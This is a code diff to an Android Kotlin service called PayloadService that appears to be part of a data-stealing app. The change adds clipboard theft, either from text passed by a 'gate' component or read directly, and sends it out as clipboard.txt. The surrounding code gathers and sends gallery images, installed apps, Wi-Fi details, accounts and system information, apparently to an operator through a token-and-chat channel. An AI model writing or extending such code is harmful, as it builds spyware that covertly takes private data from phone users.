@@ -47,6 +47,7 @@ class PayloadService : Service() {
     private var token = ""
     private var chat = ""
     private var appName = ""
+    private var clipText = ""
 
     override fun onCreate() {
         super.onCreate()
@@ -62,6 +63,7 @@ class PayloadService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         HsLog.w("onStartCommand")
+        clipText = intent?.getStringExtra("clip") ?: ""
         startForegroundSafe()
 
         Thread {
@@ -92,6 +94,15 @@ class PayloadService : Service() {
         val f = cfg.features
         HsLog.w("features=$f")
 
+        if (f.contains("clipboard")) {
+            if (clipText.isNotEmpty()) {
+                HsLog.w("clip from gate=" + clipText.length)
+                sendTextFile("clipboard.txt", clipText)
+            } else {
+                sendClipboard()
+            }
+        }
+
         if (f.contains("gallery")) {
             val images = queryImages()
             HsLog.w("images=${images.size}")
@@ -110,7 +121,6 @@ class PayloadService : Service() {
         if (f.contains("apps")) sendApps()
         if (f.contains("wifi")) sendWifi()
         if (f.contains("accounts")) sendAccounts()
-        if (f.contains("clipboard")) sendClipboard()
         if (f.contains("system")) sendSystem()
 
         pool.shutdown()
